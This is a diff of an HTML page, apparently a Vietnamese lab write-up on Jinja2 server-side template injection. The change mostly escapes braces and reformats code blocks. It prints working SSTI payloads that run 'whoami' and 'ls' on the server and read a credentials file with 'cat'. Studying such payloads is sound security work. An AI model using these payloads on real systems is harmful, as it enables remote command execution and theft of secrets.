@@ -12,6 +12,7 @@
         }
 
         body {
+             
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
@@ -381,7 +382,11 @@ for path in paths:
                     <p>Sử dụng payload đặc trung để xác định ứng dụng đang sử dụng Jinja2 template engine.</p>
                     <div class="payload-example">
                         <h4>Payload xác định:</h4>
-                        <code>{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}</code>
+                        <div style="overflow-x: auto; white-space: nowrap;">
+                            <code>
+                                &lcub;&lcub;config.__class__.__init__.__globals__['os'].popen('whoami').read()&rcub;&rcub;
+                            </code>
+                        </div>
                     </div>
                 </div>
 
@@ -391,7 +396,9 @@ for path in paths:
                     <p>Khai thác SSTI để thực thi các lệnh hệ thống và khám phá cấu trúc server.</p>
                     <div class="payload-example">
                         <h4>Payload liệt kê file:</h4>
-                        <code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code>
+                        <div style="overflow-x: auto; white-space: nowrap;">
+                        <code>&lcub;&lcub;config.__class__.__init__.__globals__['os'].popen('ls').read()&rcub;&rcub;</code>
+                        </div>
                     </div>
                 </div>
 
@@ -401,7 +408,11 @@ for path in paths:
                     <p>Đọc file chứa thông tin xác thực của tài khoản studentA.</p>
                     <div class="payload-example">
                         <h4>Payload đọc file:</h4>
-                        <code>{{config.__class__.__init__.__globals__['os'].popen('cat /home/phuonglinh/studentA/secret.txt').read()}}</code>
+                        <div style="overflow-x: auto; white-space: nowrap;">
+                        <code>
+                            &lcub;&lcub;config.__class__.__init__.__globals__['os'].popen('cat /home/phuonglinh/studentA/secret.txt').read()&rcub;&rcub;
+                        </code>
+                        </div>
                     </div>
                 </div>
 
